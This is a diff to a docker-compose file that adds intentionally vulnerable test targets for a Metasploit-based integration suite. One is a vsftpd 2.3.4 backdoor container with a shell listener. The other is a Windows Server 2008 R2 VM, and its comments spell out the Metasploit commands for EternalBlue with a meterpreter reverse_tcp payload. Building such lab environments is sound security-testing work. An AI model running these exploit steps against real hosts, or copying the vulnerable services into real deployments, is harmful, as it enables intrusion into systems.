@@ -263,6 +263,126 @@ services:
       - ../python/tests:/app/python/tests:ro
     command: bash -c "pytest python/tests/ -v --tb=short"
 
+  # ===========================================================================
+  # Test Target Containers (Vulnerable Services)
+  # ===========================================================================
+  # WARNING: These containers run intentionally vulnerable services.
+  # DO NOT expose to untrusted networks!
+
+  target-linux:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile.target
+    image: assassinate:target-linux
+    container_name: assassinate-target
+    networks:
+      - assassinate-net
+    # Ports exposed for exploitation (Docker network only, not published to host):
+    # 21: FTP (vsftpd 2.3.4 backdoor trigger)
+    # 6200: Backdoor shell (opened after exploit)
+    # 4445: Pre-configured shell listener
+    expose:
+      - "21"
+      - "6200"
+      - "4445"
+    healthcheck:
+      test: ["CMD", "/usr/local/bin/healthcheck.sh"]
+      interval: 10s
+      timeout: 5s
+      retries: 3
+    restart: unless-stopped
+    # Volume for injecting payloads dynamically
+    volumes:
+      - target_payloads:/payload
+
+  # Windows Target (KVM-based real Windows VM)
+  # REQUIRES: Linux host with KVM support (/dev/kvm)
+  # First run takes 10-20 minutes to install Windows
+  #
+  # This runs Windows Server 2008 R2 which is vulnerable to:
+  #   - EternalBlue (MS17-010) - exploit/windows/smb/ms17_010_eternalblue
+  #   - SMB vulnerabilities on port 445
+  #
+  # Usage:
+  #   docker compose -f docker/docker-compose.yml up target-windows
+  #   # Access via VNC: localhost:8006 (web) or RDP: localhost:3389
+  #
+  # Exploit:
+  #   use exploit/windows/smb/ms17_010_eternalblue
+  #   set RHOSTS target-windows
+  #   set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  #   set LHOST integration-test
+  #   exploit
+  target-windows:
+    image: dockurr/windows:latest
+    container_name: assassinate-target-windows
+    networks:
+      - assassinate-net
+    # Required for KVM acceleration
+    devices:
+      - /dev/kvm
+    cap_add:
+      - NET_ADMIN
+    # Ports for access and exploitation
+    ports:
+      - "8006:8006"   # Web VNC
+      - "3389:3389"   # RDP
+    expose:
+      - "8006"        # Web VNC
+      - "3389"        # RDP
+      - "445"         # SMB (EternalBlue target)
+      - "139"         # NetBIOS
+    # Persistent storage for Windows installation
+    volumes:
+      - windows_data:/storage
+      - target_payloads:/shared
+    environment:
+      RAM_SIZE: "4G"
+      CPU_CORES: "2"
+      DISK_SIZE: "20G"
+      # Windows Server 2008 R2 - vulnerable to EternalBlue
+      VERSION: "2008"
+    # Windows takes time to boot
+    stop_grace_period: 2m
+
+  # Integration test service - runs tests against target-linux
+  integration-test:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: ubuntu
+    image: assassinate:integration-test
+    depends_on:
+      postgres:
+        condition: service_healthy
+      target-linux:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+      MSF_ROOT: /opt/metasploit-framework
+      ASSASSINATE_WORKSPACE: default
+      # Target container settings
+      TARGET_HOST: assassinate-target
+      TARGET_FTP_PORT: "21"
+      TARGET_SHELL_PORT: "4445"
+      TARGET_BACKDOOR_PORT: "6200"
+      # Enable integration tests
+      INTEGRATION_TESTS: "true"
+    networks:
+      - assassinate-net
+    tmpfs:
+      - /dev/shm:exec,size=256m
+    volumes:
+      - ../python/tests:/app/python/tests:ro
+      - ../python/assassinate:/app/python/assassinate:ro
+      - ../rust/bridge/tests:/app/rust/bridge/tests:ro
+      - ../rust/bridge/src:/app/rust/bridge/src:ro
+      - ../rust/daemon/src:/app/rust/daemon/src:ro
+      - ../rust/ipc/src:/app/rust/ipc/src:ro
+      - ../pyproject.toml:/app/pyproject.toml:ro
+      - target_payloads:/payload
+
 networks:
   assassinate-net:
     name: assassinate-network
@@ -270,3 +390,7 @@ networks:
 volumes:
   postgres_data:
     name: assassinate-postgres-data
+  target_payloads:
+    name: assassinate-target-payloads
+  windows_data:
+    name: assassinate-windows-data
